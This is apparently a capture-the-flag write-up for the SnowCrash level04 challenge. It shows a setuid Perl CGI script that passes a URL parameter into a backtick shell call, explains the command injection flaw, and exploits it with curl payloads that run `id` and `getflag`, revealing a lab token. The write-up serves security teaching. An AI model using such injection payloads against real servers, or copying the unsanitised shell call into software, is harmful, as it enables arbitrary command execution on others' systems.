# Command substitution on argument provided by privileged user
```
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```
perl script 

CGI endpoints are specific scripts or programs that the server executes in response to user requests. Each time a request is made, a new process is started to run the script, which can make them less efficient for high traffic. They're versatile but considered older technology.

```
level04@SnowCrash:~$ cat level04.pl 
```

```
#!/usr/bin/perl
 - this means this script should be executed with the Perl interpreter

#localhost:4747
 - script accessed via web browser at localhost on port 4747

use CGI qw{param};
 - script uses Perl's CGI module to handle Common Gateway Interface (CGI) functionality

print "Content-type: text/html\n\n";

sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}

x(param("x"));
```


### Security Implications
This script has a significant security vulnerability. It directly passes user input (obtained via CGI parameters) to a shell command without any sanitation or validation. This practice can lead to command injection vulnerabilities, where an attacker could provide specially crafted input to execute arbitrary commands on the server. For example, by calling the script with the URL http://localhost:4747/level04.pl?x=$(some_malicious_command), an attacker could execute some_malicious_command on the server.

### Ensuring port 4747 is listening
```
level04@SnowCrash:~$ netstat -an | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN  
```

### Ensurint it is vulnerable to command injections
```
level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=\`id\`"
uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
```

### Replace id with getflag
```
level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=\`getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
